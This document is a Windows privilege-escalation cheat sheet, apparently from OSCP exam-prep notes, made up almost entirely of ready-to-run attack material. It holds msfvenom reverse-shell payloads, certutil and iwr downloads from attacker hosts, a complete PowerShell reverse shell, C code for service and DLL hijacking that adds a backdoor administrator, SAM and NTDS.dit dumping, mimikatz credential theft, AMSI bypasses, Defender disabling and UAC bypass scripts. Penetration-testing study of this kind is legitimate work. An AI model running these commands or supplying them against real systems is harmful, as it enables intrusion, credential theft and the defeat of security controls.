# Privilege Escalation Windows

## Table of Contents

- [Enumeration](#enumeration)
- [Service Exploitation](#service-exploitation)
- [Potato Exploits](#potato-exploits) ‚ûú [Detailed Guide](4.5.Potato-Exploits.md)
- [SeBackupPrivilege Abuse](#sebackupprivilege-abuse)
- [Registry Credentials](#registry-credentials)
- [Credential Hunting](#credential-hunting)
- [Enumeration Tools](#enumeration-tools) ‚ûú [Detailed Guide](4.6.Windows-PrivEsc-Tools.md)
- [AlwaysInstallElevated](#alwaysinstallelevated)
- [Scheduled Tasks](#scheduled-tasks)
- [DLL Hijacking](#dll-hijacking)
- [AV Evasion](#av-evasion)
- [Credential Storage Exploitation](#credential-storage-exploitation)
- [UAC Bypass](#uac-bypass)
- [See Also](#see-also)

---

## Enumeration

### Quick Enumeration (One-liner)

```cmd
:: Full system info
systeminfo && whoami /all && net users && net localgroup administrators

:: Check exploitable privileges
whoami /priv | findstr /i "SeImpersonate SeAssignPrimary SeBackup SeRestore SeTakeOwnership SeDebug"
```

```powershell
# PowerShell one-liner enum
$p=whoami /priv;if($p-match'SeImpersonate'){Write-Host '[!] Potato Exploit possible!' -ForegroundColor Red}
```

### User & Privilege Checks

| Privilege | Exploitation |
| :--- | :--- |
| SeImpersonatePrivilege | Potato Exploits (SigmaPotato, GodPotato) |
| SeAssignPrimaryTokenPrivilege | Potato Exploits |
| SeBackupPrivilege | Dump SAM/SYSTEM, copy protected files |
| SeRestorePrivilege | Overwrite protected files |
| SeTakeOwnershipPrivilege | Take ownership of any file |
| SeDebugPrivilege | Inject into processes |

---

## Service Exploitation

### Unquoted Service Path (One-liner)

```cmd
:: Find unquoted service paths
wmic service get name,displayname,pathname,startmode | findstr /i "Auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """"
```

> ‡∏ñ‡πâ‡∏≤ service path ‡∏°‡∏µ space ‡πÅ‡∏•‡∏∞‡πÑ‡∏°‡πà‡∏°‡∏µ quotes

```shell
# Attacker

msfvenom -p windows/x64/shell/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o Service.exe 

msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/shell/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit -j'

python -m http.server 80

# Victim

sc qc vulnerable_service 

C:\Program Files\Vuln\Service.exe

certutil -urlcache -split -f "http://$lhost/reverse.exe" "C:\Program Files\Vuln\Service.exe"

sc stop vulnerable_service

sc start vulnerable_service
```

---

### Weak Service Permissions

```cmd
# Attacker

msfvenom -p windows/x64/shell/reverse_tcp LHOST=$lhost LPORT=$lport -f exe -o reverse.exe 

msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/shell/reverse_tcp; set LHOST $lhost; set LPORT $lport; exploit -j'

python -m http.server 80

# Victim

accesschk.exe /accepteula -uwcqv "Everyone" "service_name"

certutil -urlcache -split -f "http://192.168.45.187/reverse.exe" "C:\reverse.exe"

sc config service_name binpath= "C:\reverse.exe"

sc start service_name
```

---

### Service Binary Hijacking

#### Example: xampp (mysql)

```c
#include <stdlib.h>
int main ()
{
int i;
i = system ("net user ar3mus password123! /add");
i = system ("net localgroup administrators ar3mus /add");
return 0;
}
```

```shell
# Attacker
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe

python -m http.server 80

# Victim

powershell -ep bypass

iwr -uri http://192.168.45.183/adduser.exe -Outfile adduser.exe

icacls "C:\xampp\mysql\bin\mysqld.exe"

move C:\xampp\mysql\bin\mysqld.exe mysqld.exe.bak

move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

whoami /priv

shutdown /r /t 0

# Check if new user was created after restart
net user
```

---

## Potato Exploits

> Used when `SeImpersonatePrivilege` or `SeAssignPrimaryTokenPrivilege` is enabled

**üìñ See full guide: [4.5.Potato-Exploits.md](4.5.Potato-Exploits.md)**

| Tool | Windows Version | Quick Command |
| --- | --- | --- |
| SigmaPotato | Modern Windows | `.\SigmaPotato.exe --revshell $lhost $lport` |
| GodPotato | All versions | `.\GodPotato.exe -cmd "cmd /c whoami"` |
| PrintSpoofer | Server 2016/2019 | `.\PrintSpoofer.exe -i -c cmd` |

### Quick Check

```cmd
whoami /priv | findstr /i "SeImpersonate SeAssignPrimaryToken"
```

---

## SeBackupPrivilege Abuse

> Used to dump SAM/SYSTEM registry hives or copy protected files

### Check Privilege

```cmd
whoami /priv | findstr SeBackupPrivilege
```

### Dump SAM & SYSTEM

```cmd
# Create backup of registry hives
reg save HKLM\SAM C:\Users\Public\SAM
reg save HKLM\SYSTEM C:\Users\Public\SYSTEM

# Transfer to attacker machine (via Evil-WinRM)
download SAM
download SYSTEM

# On Kali - Extract hashes
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### Dump NTDS.dit (Domain Controller)

```powershell
# Enable SeBackupPrivilege in current session
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege

# Create shadow copy
$shadow = (Get-WmiObject -List Win32_ShadowCopy).Create("C:\", "ClientAccessible")
$shadowPath = (Get-WmiObject Win32_ShadowCopy | Sort-Object InstallDate -Descending)[0].DeviceObject

# Copy NTDS.dit from shadow
Copy-FileSeBackupPrivilege "$shadowPath\Windows\NTDS\ntds.dit" C:\Users\Public\ntds.dit

# Copy SYSTEM hive
reg save HKLM\SYSTEM C:\Users\Public\SYSTEM
```

### Robocopy Alternative

```cmd
# Robocopy with backup mode to copy protected files
robocopy /B C:\Windows\NTDS C:\Users\Public ntds.dit
```

---

## Registry Credentials

### Auto Logon Credentials

> Windows may store auto-logon credentials in registry

```cmd
# Check for stored auto-logon credentials
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName

# One-liner to get all
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" 2>nul | findstr /i "DefaultUserName DefaultPassword DefaultDomainName"
```

```powershell
# PowerShell
Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | 
  Select-Object DefaultUserName, DefaultPassword, DefaultDomainName
```

### Saved Credentials

```cmd
# List saved credentials
cmdkey /list

# If credentials are saved, use runas
runas /savecred /user:Administrator cmd.exe
```

### PuTTY Saved Sessions

```cmd
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
```

### VNC Passwords

```cmd
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v Password
```

---

## Credential Hunting

### Search Files for Passwords

```cmd
# Search common file types
findstr /si password *.txt *.ini *.xml *.config *.cfg
findstr /spin "password" *.*

# Search entire drive
dir /s /b *pass*.txt *cred*.txt *vnc*.ini *.config
```

```powershell
# PowerShell recursive search
Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.xml,*.config -Recurse -ErrorAction SilentlyContinue |
  Select-String -Pattern "password|pwd|pass" -ErrorAction SilentlyContinue
```

### Common Credential Locations

```cmd
# Unattend files (installation passwords)
type C:\Windows\Panther\Unattend.xml 2>nul
type C:\Windows\Panther\Unattended.xml 2>nul
type C:\Windows\Panther\UnattendGC\Unattend.xml 2>nul

# Web config files
type C:\inetpub\wwwroot\web.config 2>nul
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config 2>nul

# McAfee files
type C:\ProgramData\McAfee\Common Framework\SiteList.xml 2>nul

# VNC
type C:\Users\*\.vnc\passwd 2>nul
type C:\Program Files\UltraVNC\ultravnc.ini 2>nul
```

### PowerShell History

```powershell
# Current user history
type (Get-PSReadLineOption).HistorySavePath

# All users history
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -ErrorAction SilentlyContinue | 
  ForEach-Object { Write-Output "=== $_ ==="; Get-Content $_ }
```

### Wireless Passwords

```cmd
# List saved WiFi profiles
netsh wlan show profiles

# Get password for specific profile
netsh wlan show profile name="ProfileName" key=clear
```

### DPAPI Protected Credentials

```cmd
# List DPAPI credentials
dir C:\Users\*\AppData\Local\Microsoft\Credentials\* 2>nul
dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\* 2>nul

# Use mimikatz to decrypt
mimikatz.exe
sekurlsa::dpapi
dpapi::cred /in:C:\Users\user\AppData\Local\Microsoft\Credentials\GUID
```

---

## Enumeration Tools

**üìñ See detailed tool guide: [4.6.Windows-PrivEsc-Tools.md](4.6.Windows-PrivEsc-Tools.md)**

| Tool | Command | Purpose |
| --- | --- | --- |
| winPEAS | `.\winPEASx64.exe` | Comprehensive enumeration |
| PowerUp | `Invoke-AllChecks` | Service/privilege checks |
| PrivescCheck | `Invoke-PrivescCheck` | Modern PowerUp alternative |
| Seatbelt | `.\Seatbelt.exe -group=all` | Security reconnaissance |

---

## AlwaysInstallElevated

> Registry keys must be set to 1

```cmd
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Exploit

```shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport -f msi -o malicious.msi
```

```cmd
msiexec /quiet /qn /i malicious.msi
```

---

## Scheduled Tasks

### Enumerate Scheduled Tasks

```cmd
# List all scheduled tasks
schtasks /query /fo LIST /v

# Filter by task name
schtasks /query /fo LIST | findstr "TaskName"

# Query specific task
schtasks /query /tn "\Microsoft\TaskName" /v /fo list
```

#### PowerShell Enumeration

```powershell
# List non-Microsoft tasks (custom tasks)
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft\*' }

# Get task details with actions
Get-ScheduledTask | Where-Object { $_.TaskPath -notlike '\Microsoft\*' } | 
  ForEach-Object { 
    $task = $_
    $actions = $task | Get-ScheduledTaskInfo
    [PSCustomObject]@{
      TaskName = $task.TaskName
      TaskPath = $task.TaskPath
      State = $task.State
      UserId = $task.Principal.UserId
    }
  } | Format-Table -AutoSize

# Get task action (executable path)
(Get-ScheduledTask -TaskName "TaskName").Actions
```

### Find Writable Scheduled Task Scripts

```cmd
# Check permissions on task script
icacls "C:\Path\To\Script.bat"
icacls "C:\Path\To\Script.ps1"
```

### Exploitation

```powershell
# If script is writable, replace with reverse shell
# Edit the script file
notepad C:\Path\To\Script.ps1

# Add PowerShell reverse shell
$LHOST = "$lhost"
$LPORT = 4444
$TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT)
$NetworkStream = $TCPClient.GetStream()
$StreamReader = New-Object IO.StreamReader($NetworkStream)
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)
$StreamWriter.AutoFlush = $true
$Buffer = New-Object System.Byte[] 1024
while ($TCPClient.Connected) {
  while ($NetworkStream.DataAvailable) {
    $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length)
    $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1)
  }
  if ($TCPClient.Connected -and $Code.Length -gt 1) {
    $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }
    $StreamWriter.Write("$Output`n")
    $Code = $null
  }
}
$TCPClient.Close()
```

```shell
# On Kali - wait for task to execute
nc -lvnp 4444
```

---

## DLL Hijacking

### Detection with Procmon

```cmd
# Find missing DLLs
procmon.exe    # Filter: Result = NAME NOT FOUND, Path ends with .dll
```

### PowerShell Service Enumeration

```powershell
# List services with paths (exclude svchost)
Get-CimInstance -ClassName Win32_Service | 
  Where-Object { $_.PathName -and ($_.PathName -notmatch 'svchost.exe') } | 
  Select-Object Name, DisplayName, StartName, PathName | 
  Format-Table -AutoSize

# Find services running as SYSTEM
Get-WmiObject -Class Win32_Service | 
  Where-Object { 
    $_.StartName -match "LocalSystem|NT AUTHORITY\\SYSTEM" -and 
    $_.PathName -and 
    ($_.PathName -notmatch 'svchost\.exe') 
  } | 
  Select-Object Name, DisplayName, PathName | 
  Format-Table -AutoSize
```

### Find Writable Directories in PATH

```powershell
# Check writable folders in PATH (DLL search order abuse)
$env:Path.Split(';') | ForEach-Object {
  $p = $_.Trim()
  if ($p -and (Test-Path $p)) {
    $acl = (icacls $p) -join "`n"
    if ($acl -match 'Users.*M' -or $acl -match 'Everyone.*M') {
      [PSCustomObject]@{ Path = $p; ACL = $acl }
    }
  }
} | Format-Table -AutoSize
```

### Find Writable Service Directories

```powershell
# Find service folders writable by Users
Get-WmiObject -Class Win32_Service | ForEach-Object {
  $svc = $_
  if (-not $svc.PathName) { return }
  $exe = ($svc.PathName -replace '"','').Split(' ')[0]
  if (-not $exe) { return }
  $folder = Split-Path $exe -ErrorAction SilentlyContinue
  if (-not $folder -or -not (Test-Path $folder)) { return }
  if ($folder -match [regex]::Escape($env:windir) -and $folder -match 'System32') { return }
  try { $aclText = icacls $folder 2>$null } catch { $aclText = $null }
  if ($aclText -and ($aclText -match 'Users.*M' -or $aclText -match 'Everyone.*M')) {
    [PSCustomObject]@{
      Service = $svc.Name
      ExePath = $exe
      Folder = $folder
    }
  }
} | Format-Table -AutoSize
```

### Create Malicious DLL

```c
// malicious.c - Add user to administrators
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        system("net user backdoor Password123! /add");
        system("net localgroup administrators backdoor /add");
    }
    return TRUE;
}
```

#### Create DLL with Reverse Shell

```c
// revshell.c - Execute reverse shell
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        system("powershell -e <BASE64_ENCODED_PAYLOAD>");
    }
    return TRUE;
}
```

### Compile DLL

```shell
# Install MinGW on Kali
sudo apt install mingw-w64

# Compile x64 DLL
x86_64-w64-mingw32-gcc -shared -o malicious.dll malicious.c -O2 -s

# Compile x86 DLL
i686-w64-mingw32-gcc -shared -o malicious.dll malicious.c -O2 -s

# Verify DLL
file malicious.dll  # Should show PE32+ (DLL) x86-64
```

### Exploitation Steps

```shell
# 1. Transfer DLL to target
python -m http.server 80

# 2. On target - download and place DLL
certutil -urlcache -split -f "http://$lhost/malicious.dll" "C:\VulnerableApp\missing.dll"

# 3. Restart service or wait for application to load DLL
sc stop VulnerableService
sc start VulnerableService

# 4. Connect with new admin user
impacket-psexec backdoor:Password123!@$rhost
```

---

## AV Evasion

> Techniques to bypass Windows Defender and AV detection

### ThreatChecker

> Identifies which bytes in a file trigger AV detection

```shell
# Download from GitHub
# https://github.com/rasta-mouse/ThreatCheck

# Check file for AV signatures
ThreatChecker.exe -f payload.exe

# Check with specific engine
ThreatChecker.exe -f payload.exe -e AMSI
ThreatChecker.exe -f payload.exe -e Defender

# Example output shows byte offset of detection
# Use this to modify specific parts of payload
```

### DefenderCheck

```shell
# Similar tool for Defender
DefenderCheck.exe payload.exe
```

### Obfuscation Techniques

#### AMSI Bypass

```powershell
# PowerShell AMSI Bypass (Matt Graeber)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# One-liner (encoded)
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
```

#### Disable Defender (Requires Admin)

```cmd
:: Disable real-time protection
Set-MpPreference -DisableRealtimeMonitoring $true

:: Add exclusion path
Set-MpPreference -ExclusionPath "C:\Temp"

:: Add exclusion for process
Set-MpPreference -ExclusionProcess "mimikatz.exe"
```

#### Payload Modification

```shell
# Shikata Ga Nai encoding (multiple iterations)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=4444 \
  -e x64/xor_dynamic -i 5 -f exe -o payload.exe

# Change entry point
# Modify metadata
# Add benign code sections
```

---

## Credential Storage Exploitation

### Windows Credential Manager Locations

> Dump stored credentials from Windows Vault

```powershell
# List all stored credentials
cmdkey /list
```

> Export stored credentials (requires credentials stored in vault)

```powershell
# Access credentials programmatically
$cred = New-Object System.Management.Automation.PSCredential("domain\user", (ConvertTo-SecureString "password" -AsPlainText -Force))
```

### PowerShell History Extraction

> Check PowerShell history file

```powershell
type $PROFILE\PSReadline\ConsoleHost_history.txt
```

> Search for passwords in history

```powershell
Get-History | Where-Object {$_.CommandLine -match "password|pwd|pass"} | Select-Object CommandLine
```

> Or check history file directly

```powershell
type "C:\Users\$username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt"
```

### Registry Credential Storage

> Dump AutoLogon credentials

```powershell
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUsername
```

> Get RDP credentials from registry

```powershell
reg query "HKCU\Software\Microsoft\Terminal Server Client\Default" /s
```

> Check for cached credentials

```powershell
reg query "HKLM\Security\Cache" 
```

### File-Based Credential Storage

> Search for unattend.xml with credentials

```powershell
dir C:\Windows\Panther\ -Recurse -Filter unattend.xml
Get-ChildItem "C:\Windows\Panther\" -Recurse -Filter "*.xml" | type
```

> Look for sysprep.inf

```powershell
type "C:\Windows\System32\sysprep\sysprep.inf"
type "C:\Windows\sysprep.inf"
```

> Search common credential file locations

```powershell
# .git-credentials
type "C:\Users\$username\.git-credentials"

# SSH keys
dir "C:\Users\$username\.ssh\" -File

# RDP connection files
dir "C:\Users\$username\AppData\Local\Microsoft\Terminal Server Client\" -Recurse
```

> Search for hardcoded passwords in config files

```powershell
Get-ChildItem -Path "C:\Program Files" -Recurse -Filter "*.config" -ErrorAction SilentlyContinue | 
  Select-String -Pattern "password|pwd|secret" | Select-Object Path, Line
```

### VNC & Remote Tools Credentials

> Extract VNC password

```powershell
reg query "HKCU\Software\RealVNC\vncserver" /v Password

# If encrypted, extract from registry binary
$key = (Get-ItemProperty 'HKCU:\Software\RealVNC\vncserver').Password
# Decrypt with known VNC key algorithm
```

> TightVNC stored password

```powershell
reg query "HKCU\Software\TightVNC" /s
```

> UltraVNC password

```powershell
reg query "HKCU\Software\UltraVNC" /s
```

### DPAPI Protected Credentials Decryption

> Find DPAPI protected data

```powershell
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
```

> Decrypt with DPAPI (if user session)

```powershell
Add-Type -AssemblyName System.Security
$dpapi = New-Object System.Security.Cryptography.DataProtectionScope
$encryptedBytes = [Convert]::FromBase64String("BASE64_ENCRYPTED_STRING")
$decryptedBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedBytes, $null, $dpapi.CurrentUser)
[System.Text.Encoding]::Unicode.GetString($decryptedBytes)
```

### IIS Credentials Extraction

> Dump IIS AppPool credentials

```powershell
# Get AppPool identity
Get-WmiObject IIsApplicationPool -Namespace 'root\microsoftiis' | Select-Object Name, AppPoolIdentity

# Extract from IIS metabase
type "C:\Windows\System32\inetsrv\MetaBase.xml" | findstr /S "password"
```

> Check IIS logs for credential leaks

```powershell
type "C:\inetpub\logs\LogFiles\W3SVC1\*" | findstr "password|pwd|user="
```

### Task Scheduler Credential Dumps

> List scheduled tasks and owners

```powershell
Get-ScheduledTask | Where-Object {$_.Principal.UserId -ne "NT AUTHORITY\SYSTEM"} | 
  Select-Object TaskName, @{N="User";E={$_.Principal.UserId}}
```

> Extract task XML (may contain embedded credentials)

```powershell
$task = Get-ScheduledTask -TaskName "TaskName"
Export-ScheduledTask -TaskName $task.TaskName -TaskPath $task.TaskPath | Out-File task.xml
type task.xml | findstr "password"
```

### WinRM/Remote Execution Credentials

> Check WinRM trusted hosts

```powershell
Get-WSManCredSSP
```

> List cached Kerberos tickets

```powershell
klist
klist tickets
```

> Dump credentials from LSASS (requires SYSTEM)

```powershell
# Using mimikatz
mimikatz # sekurlsa::logonpasswords

# Or use LaZagne
.\LaZagne.exe all
```

---

## UAC Bypass

> User Account Control bypass techniques for privilege escalation from medium to high integrity

### Check UAC Status

```cmd
:: Check UAC settings
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
```

| ConsentPromptBehaviorAdmin | Description |
|---------------------------|-------------|
| 0 | No prompt (UAC disabled for admins) |
| 1 | Prompt on secure desktop |
| 2 | Prompt (not secure desktop) |
| 5 | Default - Prompt for non-Windows binaries |

### Fodhelper UAC Bypass

> Works on Windows 10, requires local admin in Administrators group

```cmd
:: Set registry key to execute our payload
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Windows\Temp\shell.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f

:: Trigger the bypass
fodhelper.exe

:: Cleanup
reg delete HKCU\Software\Classes\ms-settings /f
```

### Eventvwr UAC Bypass

> Works on Windows 7/8/10

```cmd
:: Set registry key
reg add HKCU\Software\Classes\mscfile\shell\open\command /d "C:\Windows\Temp\shell.exe" /f

:: Trigger the bypass
eventvwr.exe

:: Cleanup
reg delete HKCU\Software\Classes\mscfile /f
```

### ComputerDefaults UAC Bypass

```cmd
:: Set registry key
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe /c C:\Windows\Temp\shell.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /f

:: Trigger
computerdefaults.exe

:: Cleanup
reg delete HKCU\Software\Classes\ms-settings /f
```

### UACME Tool

> <https://github.com/hfiref0x/UACME>

```cmd
:: Use method 23 (fodhelper)
Akagi64.exe 23 C:\Windows\Temp\shell.exe

:: Use method 33 (sdclt)
Akagi64.exe 33 C:\Windows\Temp\shell.exe
```

### PowerShell Bypass Script

```powershell
# Fodhelper bypass
function Invoke-FodhelperBypass {
    param([string]$Command)
    
    New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
    Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $Command -Force
    New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Force
    
    Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
    Start-Sleep -Seconds 3
    
    Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
}

# Usage
Invoke-FodhelperBypass -Command "cmd.exe /c C:\Windows\Temp\shell.exe"
```

---

## See Also

- **[AD Exploitation](../3.AD-Exploit/3.1.AD-Exploitation.md)** - AD-specific privilege escalation paths
- **[Kerberos Attacks](../3.AD-Exploit/3.3.Kerberos-Attacks.md)** - Kerberoasting, ASREPRoast, Golden/Silver tickets
- **[NTLM Relay](../3.AD-Exploit/3.4.NTLM-Relay-and-Responder.md)** - NTLM relay and Responder attacks
- **[Password Attacks](../3.AD-Exploit/3.2.Password-Attacks.md)** - mimikatz, LaZagne, credential extraction
- **[Lateral Movement](../5.Lateral-Movement/5.1.Lateral-Movement.md)** - Move after escalation
- **[Ligolo-ng Pivoting](../5.Lateral-Movement/5.3.Ligolo-ng-Complete-Guide.md)** - Tunnel through compromised machines
- **[OSCP Exam Guide - Windows PrivEsc](../9.OSCP-Exam/9.1.OSCP-Exam-Guide.md#phase-3-privilege-escalation---windows-15-‡∏ô‡∏≤‡∏ó‡∏µ)** - Quick reference
